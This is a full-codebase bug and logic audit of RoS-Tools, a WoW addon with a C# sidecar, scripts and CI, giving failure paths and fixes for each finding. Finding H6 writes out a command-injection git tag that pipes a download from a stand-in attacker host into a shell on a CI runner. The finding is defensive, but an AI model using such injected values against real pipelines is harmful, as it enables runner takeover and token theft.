# RoS-Tools — full-codebase bug & logic audit

> **Status: every finding below was fixed on 2026-08-31.** Three rounds: the
> fixes, an adversarial review of the fixes (which caught three that were *worse*
> than the bugs they replaced, plus a dozen vacuous new assertions), and a third
> round fixing those. Every fix carries a regression test confirmed to fail
> without it. Suite went 189 -> 288 C# tests, 49 -> 163 Lua assertions, plus 60
> Python and 69 PowerShell. See `CHANGELOG.md` under Unreleased. This file is
> kept as the record of what was wrong and why.

**Date:** 2026-08-31 · **Scope:** all Lua, C#, PowerShell, Python and CI in the repo.

**What was actually exercised vs. reasoned about:**

- `lua5.1` + `luac5.1` available in the review container. `Tools/sync-harness.lua`
  (44 assertions) and `Tools/events-missing-check.lua` (5) both **pass**; every
  `Core/`, `Modules/`, `Data/` file compiles clean under `luac5.1 -p`.
- Findings marked **[verified]** were reproduced with an executable probe against
  the real `Core/*.lua` (the harness prelude re-used). Everything else is a read
  of the source with a traced failure path.
- **Not run:** `dotnet test` (no .NET SDK on either machine) and `luacheck`
  (not installed). Every C# finding below is source-read plus a re-read of the
  surrounding code; none is test-confirmed.

Severity is about *silence*: a bug that announces itself is cheaper than one that
degrades quietly, and this codebase's whole failure mode is silence.

## High

### H1 — `PollService.cs:105` — the backoff is inverted; failures make the sidecar poll *more* often

```csharp
baseline = _backoff < baseline ? _backoff : baseline;   // min(), not max()
```

`MinimumBackoff` 5 min, `MaximumBackoff` 1 h, `MinimumPollHours` 1 h — so the
backoff can never exceed the baseline and the ternary only ever *shortens* the
delay. The comment three lines above states the opposite invariant and describes
this exact behaviour as the bug it fixed.

**Failure:** default 6 h interval. CI publishes an export the validator refuses,
or the URL 404s. Check 1 fails → `_backoff = 5 min` → next delay ≈ 5 min, then
10 → 20 → 40 → 60, pinned at hourly for as long as the upstream problem lasts.
6× the steady-state request rate to `raw.githubusercontent.com`, on every
maintainer machine, with no jitter beyond ±10%. **There are no `PollService`
tests at all.**

**Fix:** `baseline = _backoff > baseline ? _backoff : baseline;`

### H2 — `Modules/Roster.lua:19` — `SUFFIX_PATTERN` can never match, so `stripSuffix` is a no-op **[verified]**

```lua
local SUFFIX_PATTERN = " |cff%x%x%x%x%x%x%x%x%(%d+%)|r"
```

`|cff` is already `|c` plus two of the eight hex digits. The pattern therefore
demands ten hex digits after `|c`. `stripColors` two lines below gets it right
(`"|c%x%x%x%x%x%x%x%x"`); this one does not.

Reproduced: `(" ... |cffff8000(620)|r"):gsub(SUFFIX_PATTERN, "")` replaces **0**
occurrences. Consequences, all silent:

- `annotate` (line 208) computes `base` from text that still carries the previous
  suffix, so any refresh that survives the memo appends a second `(620)`.
- `matchKey` (line 48) leaves the ilvl digits in the comparison key —
  `peidaemoonguard620` vs. wanted `peidaemoonguard` — demoting an already-annotated
  row from an exact rank-1 match to a rank-3 prefix match.

The module comment at lines 14–18 documents the doubling this pattern exists to
prevent; the fix landed on the anchor and missed the pattern itself.

**Fix:** `" |c%x%x%x%x%x%x%x%x%(%d+%)|r"`.

### H3 — `Tools/fetch_guild_info.py:214-231, 246` — a partial roster is written over the complete one, exit 0

`get()` returns `None` for a real 404 *and* after exhausting its 5 retries on
429/5xx; `fetch()` returns `None` for any `RequestException`. All three collapse
into `failures += 1`, and `write_lua()` at line 246 runs with no threshold on
`failures`.

**Failure:** 222 members. Blizzard throttles for ~15 s; the total retry budget is
`0.25+0.5+1+2 = 3.75 s` per request, so every in-flight request exhausts it. The
run prints `Wrote 178 entries`, `44 characters skipped`, and **exits 0**.
`compare_guild_data.py`'s floor is `int(222*0.66) = 146`, so 178 sails through,
the export publishes to `guild-data`, the sidecar installs it, and peer sync
propagates 44 missing members guild-wide.

**Related, same file:** `Retry-After` is never read (line 96), and the output is
written with `path.open("w")` — truncate-in-place. Ctrl-C or a full disk mid-write
destroys the committed payload, and the default `--out` *is* `Data/GuildData.lua`.

**Fix:** count retry-exhausted/exception failures separately from 404s and
`return 1` without writing above a small threshold; `os.replace()` from a `.tmp`.

### H4 — `Tools/compare_guild_data.py:112-115` — the publish guard is count-only

`meta` is parsed from the new export solely to `print` it. The only gate is
`len(new) < int(len(old) * 0.66)`. Neither `region`/`realm`/`guild` nor roster
overlap is compared.

**Failure:** a `workflow_dispatch` run with `region: eu`, or a `guild` typo that
resolves to a different real guild, produces a valid export of ~200 completely
different characters. The guard passes, `describe_changes` writes "200 added, 222
removed" into the commit message, and an entirely foreign roster publishes to
`guild-data` and ships to CurseForge. This is precisely the "renamed guild" case
the module docstring claims to defend against.

**Fix:** exit 2 when the meta identity differs, and when `len(old & new)/len(old)`
falls below a floor.

### H5 — `SettingsStore.cs:44-51` — a transient read failure is treated as corruption, and the next save destroys the DPAPI secret

`Load()` catches `Exception`, not `JsonException`, and replaces `Current` with
`new SidecarSettings()` without preserving the file it could not read.
`UpdateService.Record()` calls `_store.Update(...)` on every check → `Save()` →
defaults written over the original.

**Failure:** the sidecar starts at logon while a backup agent or AV holds
`%LOCALAPPDATA%\RoS-Tools\sidecar.json` with `FileShare.None`. One `Log.Warn`
line, then 30 s later the first poll overwrites it. Permanently lost:
`BlizzardClientSecretProtected` (unrecoverable — must be re-entered),
`AddOnPath`, `GuildRegion/Realm/Name` (so the cross-guild admission check stops
enforcing), and the whole `Destinations` cache.

**Fix:** rename to `sidecar.json.bad` on any load failure before falling back.

### H6 — `.github/workflows/sidecar.yml:93,120` — the git tag is interpolated unquoted into `run:` blocks

`steps.version.outputs.value` is `${GITHUB_REF_NAME#sidecar-v}`, substituted
textually into a pwsh `run:` (93) and a bash assignment (120). Git tag names
permit `$`, backtick, `(`, `)`, `;`, `&`, `|`.

**Failure:** pushing `sidecar-v1.0.0$(curl -s attacker/x|sh)` executes on the
Windows runner, which holds `contents: write` and therefore the `GITHUB_TOKEN`.

**Fix:** pass via `env:` and reference `"$VERSION"`; validate against
`^[0-9]+\.[0-9]+\.[0-9]+$` first.

**Same file, line 28-29:** `permissions: contents: write` is workflow-level, so
the `test` job inherits it on `pull_request` — and MSBuild targets in a PR
execute during restore. Move it to the `publish` job.

### H7 — `scripts/Install-Dev.ps1:179` — the destination is wiped before the payload is validated, and `finally` deletes the kept roster

`Remove-Item -LiteralPath $dest -Recurse -Force` (179) runs *before* the per-item
existence check at 184-186, and `$keep` lives in `$work`, which the `finally` at
226 removes unconditionally.

**Failure:** `ROSTOOLS_KEEP_DATA=1`, `ROSTOOLS_REF` set to a ref predating
`Data/` (or one copy fails on a file WoW has open). Line 170 stashes
`GuildData.lua` into `$work`; line 179 deletes the addon folder; line 185 throws;
the `finally` deletes `$work`. The user ends with an empty `RoS-Tools` folder and
no roster anywhere.

**Fix:** validate every `$payload` item against `$src.FullName` before the
`Remove-Item`, and stage `$keep` outside `$work`.

### H8 — `scripts/Install-Sidecar.ps1:262` — an unguarded `Test-Path` *after* the running sidecar has been killed

The kill loop is 239-259; the probe is `if (-not (Test-Path -LiteralPath $targetDir))`
at 262, with no `-ErrorAction SilentlyContinue`.

**Failure:** `ROSTOOLS_SIDECAR_PATH='Z:\Sidecar'` on a machine where `Z:` is not
mounted. Download and checksum succeed, the running instance is killed, then line
262 throws "Cannot find drive" under `$ErrorActionPreference='Stop'`. Nothing in
the catch restarts it — so the one machine seeding the guild's peer sync is
silently stopped with nothing installed.

**Same trap, line 57:** `Get-InstalledVersion`'s `Test-Path -LiteralPath $Exe`
sits *outside* its `try` with no `-EA SilentlyContinue`. A Run key naming a
removed drive aborts the entire install before a byte is downloaded, where the
obvious intent is `return $null`.

**Same trap, `Install-Dev.ps1:57`** on `ROSTOOLS_ADDONS_PATH`, which makes the
friendly `throw` on line 58 unreachable for the most likely bad value.

### H9 — `Web/ConsoleApi.cs:253 / 295` — the `IsRunning` check is not atomic with `MarkStarting()`

Between them sit a `JsonSerializer.Deserialize`, a `store.Snapshot()` and a DPAPI
`Unprotect` syscall. Two consequences:

- **An `/api/install` landing in that window** takes `PullService`'s semaphore
  first. The queued pull's `WaitAsync(0)` returns false and returns *without
  assigning `Last` or `Progress`* (`PullService.cs:156-160`), so `/api/pull`
  reports `running:false` with the **previous** pull's result — the console
  re-renders a stale roster with a live Install button and a green "ok".
- **A double-click on Pull roster** (the button is only disabled in the `.then`)
  lets both requests pass. B's linked CTS overwrites A's in `_pullCancellation`;
  A wins the semaphore and runs the ~180-call pull; B's `finally` sees
  `ReferenceEquals` true for itself and nulls the field. `DELETE /api/pull` then
  answers `{"ok":true,"message":"Cancelling."}` while the pull burns the whole
  quota.

**Fix:** one `TryStart()` inside `PullService` doing the check and the flag under
a single lock; store the CTS only once the semaphore is actually held; set
`Last`/`Progress` on the contended path.

### H10 — `Tools/fetch_guild_info.py:159` + `Core/Data.lua:223` + `Core/Sync.lua:561` — an unescaped meta field silently kills sharing guild-wide **[verified]**

`escape_lua` is applied only to character keys (line 161); `LUA_HEADER.format(**meta)`
takes `realm`/`guild` from `slugify()` — which strips apostrophes and collapses
whitespace but leaves `"`, `\`, `:` and `;` intact — and takes `region` straight
from `args.region` with no slugify at all. `guild-data.yml:87-89` pipes free-form
`workflow_dispatch` inputs into all three.

Two independent failures from the same root:

1. `--region 'us"'` emits `region = "us"",` — a Lua 5.1 syntax error.
   `compare_guild_data.py` parses by regex and never compiles Lua;
   `release.yml:112` only greps for `ns.GuildData` and `generated_epoch`, both of
   which still match. It ships. `ns.GuildData` is nil, and per `Core/Data.lua:70`
   `IdentityKey()` returning nil means the client can never adopt a peer snapshot
   again either.
2. A `:` or `;` anywhere in `region`/`realm`/`guild` breaks `Data:Export()`'s
   `H:` header, whose fields `Sync.parseBody` captures as `[^:;]*`. Verified with
   a two-client harness run: with `guild = "riddle:of:steel"`, the peer **never
   adopts** — every transfer completes and is thrown away as "malformed header",
   and the holder keeps burning its serve budget answering requests it can only
   fail. `GuildDataValidator.HeaderUnsafe` guards exactly this on the sidecar
   path; nothing guards it on the exporter → `guild-data` → CurseForge path, and
   nothing guards it in the addon before serving.

**Fix:** run every meta value through `escape_lua` *and* reject `[:;|"\\]` in the
exporter; add the same refusal to `Data:Export()` so a bad file can't be served.

## Medium

### M1 — `UpdateService.cs:100` — a 304 to a genuinely unconditional (forced) request is reported as "Already up to date"

The guard is `if (!cacheUsable || state is null)`, but the request is
unconditional when `unconditional = force || !cacheUsable` (line 82). `force ==
true` with a usable cache sends no validators, yet a 304 falls through to
`AlreadyCurrent`. A maintainer behind a caching proxy clicking "Check now" has
their explicit cache bypass silently defeated, with no log line.
`UpdateServiceTests.A_304_to_an_unconditional_request_is_a_failure` only covers
`force: false`. **Fix:** gate on `unconditional`, not `cacheUsable`.

### M2 — `Core/Util.lua:89` — `NormalizeKey` mangles any input whose realm contains a space **[verified]**

The title-stripping heuristic `text = text:match("%S+$")` takes the last
whitespace-delimited token, so:

```
NormalizeKey("Peidae-Moon Guard", "khadgar")  ->  "Guard-khadgar"     -- wrong
NormalizeKey("Peidae-MoonGuard",  "khadgar")  ->  "Peidae-moon-guard" -- right
```

`Roster.lua:106-110` documents this hazard and routes around it. The remaining
callers are safe by luck — `sender`, `GetGuildRosterInfo` and player hyperlinks
all use the space-stripped realm form — **except `/ros who`**, which takes free
text. `/ros who Peidae-Moon Guard` fails the exact lookup *and* the
`Data:Find` fallback (needle has a space where the key has a hyphen), so the user
is told there is no such character. **Fix:** only strip a leading title when the
remainder contains no `-`, or split on `-` before the `%S+$` step.

### M3 — `Core/Comm.lua:73-77` — the broadcast cooldown drops an ilvl change rather than deferring it **[verified]**

The 60 s cooldown check returns without rescheduling and without updating
`lastBroadcastIlvl`. Reproduced: broadcast 300 at t=0; a genuine upgrade to 320 at
t=20 is suppressed; at t=300, with no further equipment change, **320 has still
never been sent**. The guild does not learn the new number until the player
happens to swap gear again. **Fix:** on cooldown, `C_Timer.After(remaining,
broadcastIfChanged)` instead of returning.

### M4 — `Modules/Roster.lua:191` — the memo means a changed ilvl never refreshes an open roster

`if st.key == key and st.fs:GetText() == st.text then return end` — `st.text` was
built from the *old* ilvl and still matches the widget, so a live Comm update or
a freshly adopted snapshot is invisible until Blizzard happens to rewrite the
name. **Fix:** include `ilvl` in the memo key.

### M5 — `DataInstaller.cs:23-35` — the `.bak` is copied from a destination nobody validated

Validation ran on the staging file, never on the destination. A CurseForge addon
update or an interrupted third-party write truncates `GuildData.lua`; the next
install copies that truncation over the last good `.bak`, and if the `File.Move`
then fails, `LooksInstalled` returns true for the non-empty truncated file so no
restore happens either. `DataInstallerTests` covers three successful installs and
no failure path. **Fix:** skip the `.bak` copy unless the current destination
passes `GuildDataValidator.Validate`.

*Also:* `destinationPath + ".new"` (line 44) is a **fourth** path opened under
`_retail_`. CLAUDE.md states "exactly three paths … and nothing else". Either the
code or the constraint should move; the constraint is described as what makes the
design defensible, so this deserves a deliberate decision.

### M6 — `PollService.cs:42-47, 59` — every manual check triggers a second, immediate, duplicate check

`CheckNowAsync` runs `ExecuteAsync`, then `WakeLoop()` cancels `_sleep`;
`SleepAsync` swallows the cancellation and returns, and the `while` body falls
straight into `ExecuteAsync` again. The user sees "Updated: 187 characters…" and
then, within a second, "Already up to date." overwriting it — plus two HTTP
requests per click. **Fix:** have `SleepAsync` signal that it was woken and
`continue` into another sleep.

### M7 — `GuildDataValidator.cs:871, 877, 922, 982, 986` — the Lua-shape walkers treat Unicode whitespace as whitespace; Lua does not

`char.IsWhiteSpace` and `\s` are Unicode-aware in .NET and match U+00A0, U+2007,
U+202F. Lua 5.1's lexer uses C `isspace` and rejects byte `0xC2` outright. A file
with one NBSP separator — `["Zuull-illidan"]\u00A0= 302,` — passes every check,
installs, and then fails to compile in WoW: zero characters shown *and*
`IdentityKey()` nil, so the client can never adopt a peer snapshot again. The
class documents this exact hazard for `SyncKeyShape()` and then reintroduces it in
the walkers. **Fix:** ASCII-only whitespace test, and spell out the regex class.

### M8 — `Blizzard/PullService.cs:213-221, 596` — `SlugShape` rejects legitimate non-ASCII slugs and blames the user

`\A[a-z0-9]+(?:-[a-z0-9]+)*\z`, but `BlizzardApiClient.Slugify` deliberately does
not fold diacritics (pinned by `BlizzardApiClientTests`: `"Éonar" → "éonar"`).
Guild "Légion" dies before any API call with *"'légion' is not a usable guild
name. Use the plain name as it appears in-game"* — which is what was typed. This
gate is strictly narrower than the admission gate it claims to pre-empt
(`HeaderUnsafe` only rejects `[:;|]`). **Fix:** reject what actually breaks the
Lua literal and the sync header, not everything non-ASCII.

### M9 — `Blizzard/PullService.cs:508-523` — the shrink guard is relative-only, and skipped when there is no baseline

`if (current.Ok && current.Entries > 0)`. On a fresh machine, or one whose
installed roster the validator rejects, the only remaining check is
`collected.Count > 0`. Blizzard has a bad ten minutes, 177 of 180 characters
return 503 and are logged as warnings; 3 entries validate, install, get a fresh
`generated_epoch`, and `Core/Sync.lua` announces them as the guild's newest
roster. **Fix:** refuse without an override when `missing / targets.Count`
exceeds a fraction — a signal `RunAsync` already has.

### M10 — `.github/workflows/release.yml:102-118` — the `guild-data` swap-in is unconditional

Nothing compares `generated_epoch` between the branch copy and the tree copy; the
two `grep`s confirm shape, not freshness. If the daily workflow has been failing
(note it only errors when the vars are *unset*, not when they're wrong) and a
maintainer regenerates locally and commits to `main`, line 117 replaces that fresh
file with the stale branch copy — the exact opposite of the documented intent.

**Same file, line 150:** the exclusion list is correct today (`.git*`, `build`,
`Tools`, `scripts`, `Sidecar`, `*.md` all present), but `unzip -l` only *prints*.
Delete `--exclude 'Sidecar'` and the workflow stays green while ~40 C# files ship.
**Fix:** `unzip -l "$zip" | grep -Eq "$ADDON_NAME/(Sidecar|Tools|scripts)/" && exit 1`.

### M11 — `AutoStart.cs:22` — `IsEnabled()` accepts any non-empty Run value

Never compared against `Environment.ProcessPath`, and nothing re-asserts it at
startup. Move the exe by hand and Windows silently launches nothing at sign-in
while Settings keeps the box ticked — and the machine seeding the guild's roster
quietly stops advancing. `Install-Sidecar.ps1:285-293` is the only thing that
repairs it. **Fix:** compare the stored value to `ProcessPath` and rewrite it when
`StartWithWindows` is true.

### M12 — `Install-Sidecar.ps1:143` — the release filter ignores `draft` and `prerelease`, and the RC ties with the stable

`Where-Object { $_.tag_name -clike "$tagPrefix*" }` only. `sidecar-v1.4.0-rc1`
parses (line 146 splits on `[+-]`) as `1.4.0`, sorts above stable `1.3.0`, and is
installed by everyone running the one-liner. Worse: once installed, the later
stable `sidecar-v1.4.0` compares **equal**, so line 171 reports "already up to
date" and the RC is never replaced. **Fix:** `-and -not $_.prerelease -and -not
$_.draft`, and reject prerelease suffixes rather than stripping them.

### M13 — `Install-Sidecar.ps1:240` — the running instance is found by a hard-coded process name

`$processName = 'RoSToolsSidecar'` is a constant, but `Resolve-Target` honours any
`.exe` filename via `ROSTOOLS_SIDECAR_PATH`. With a renamed exe, `Get-Process`
finds nothing, `$wasRunning` stays false, the live process keeps its file lock,
and the 10-attempt `Move-Item` loop burns five seconds then throws "Could not
replace" with no hint that the tray app needs closing. **Fix:** derive it from
`[IO.Path]::GetFileNameWithoutExtension($target)`.

### M14 — `scripts/Deploy-RoSTools.ps1:101-102` — the `Join-Path` drive trap CLAUDE.md documents, still present

`Join-Path $candidate '_retail_\Interface\AddOns'` resolves the drive qualifier
through the provider and throws `DriveNotFoundException`; `Test-Path` on 102 has
no `-ErrorAction SilentlyContinue`. WoW on a detached `E:` ends the run with
"Cannot find drive" instead of falling through to the next candidate and the
friendly `throw` at 105. `Install-Dev.ps1:97-107` already fixed this by
concatenating strings; this file was not updated.

### M15 — `Program.cs:17, 33` — the single-instance mutex is claimed before the `ShowSettings` event exists

A second launch inside that window gets `isOnlyInstance = false`, then
`TryOpenExisting` fails because the first process has not created the event yet,
and it exits 0 — no window, no tray icon, no message. **Fix:** create the
`EventWaitHandle` before the mutex, or retry `TryOpenExisting` briefly.

### M16 — `TrayContext.cs:449-451` — `_poll` is disposed before `_console`, which holds a live callback into it

`OpenConsole` hands `ConsoleApi` the closure `() => _poll.CheckNowAsync(force: true)`.
`_poll.DisposeAsync()` disposes `_shutdown` and `_oneAtATime`; the console listener
is only stopped two lines later. A console request in flight during Quit throws
`ObjectDisposedException` out of the handler. `PollService.DisposeAsync` also
awaits only `_loop` and has no `_disposed` guard, so it does not track in-flight
manual checks at all. **Fix:** dispose the console first; track outstanding checks.

### M17 — `Web/ConsolePage.cs:460-461` — `renderResult` dereferences `state` on the line after guarding it, and what it skips is the shrink warning

Line 460 correctly writes `state && state.installed && …`; line 461 writes
`state.shrinkFloorPercent` unguarded. If `/api/state` 500s (e.g. `FindAddOnFolder`
hits an `UnauthorizedAccessException`, caught and returned as `{"ok":false}`),
`renderResult` has already unhidden `#resultCard` and filled the stats before
throwing — leaving an enabled **Install to addon** button and **no shrink warning**.
**Fix:** `var floor = state ? … : 0;` and make a throw disable the button.

### M18 — `BlizzardApiClient.cs:98-121` — `AuthenticateAsync` is the only call with no retry

Every data call goes through the 5-attempt loop with `Retry-After` handling; the
token POST has none. A single 503 from `oauth.battle.net` throws away the whole
pull with no suggestion to retry.

### M19 — `Web/ConsoleServer.cs:33-46` — the bootstrap token does not provide the protection its comment claims

The stated threat is another local process reading the command line; the
mitigation is that the URL carries a bootstrap. But `HandleAsync:280` answers a
valid bootstrap with `ConsolePage.For(Token)` — the full session token in the
body. A process polling command lines can fetch `/` before the browser finishes
launching, scrape `__SESSION_TOKEN__`, and hold full `/api/install` + `/api/pull`
access for the process lifetime. The maintainer sees only "That link has already
been used", and nothing is logged. Either bind redemption to something the racer
lacks, or drop the claim and treat local processes as trusted consistently.

### M20 — `compare_guild_data.py:15-16` + `guild-data.yml:114-131` — exit 1 means both "nothing changed" and "Python crashed"

Any uncaught exception exits 1, which the workflow's `case` maps to
`publish=false` and a green run. A `UnicodeDecodeError` on a corrupted `old.lua`
prints "No item level changes; nothing published" and the data quietly stops
updating. **Fix:** wrap `main()` so unexpected exceptions return 2.

### M21 — `Core/Data.lua:294` — `Count()` and `Export()` disagree when legacy keys exist **[verified]**

The doc comment says `Count()` "has to describe the same thing `Export()` would
serialize", but line 157 increments `count` for `RiddledTooltip_DB` backfills that
line 228 then excludes. Reproduced: `Count()=222`, `Export()` writes 220. The
inflated number goes out in the `V:` announce. Harmless today (receivers parse
`count` and never use it), but the invariant is load-bearing by its own comment.

### M22 — `Web/ConsoleApi.cs:63-66` — the catch-all returns `ex.Message` verbatim in the JSON body

Full filesystem paths today; an unbounded exception-message channel on the same
endpoint set that handles the client secret. Return a fixed string; log the detail.
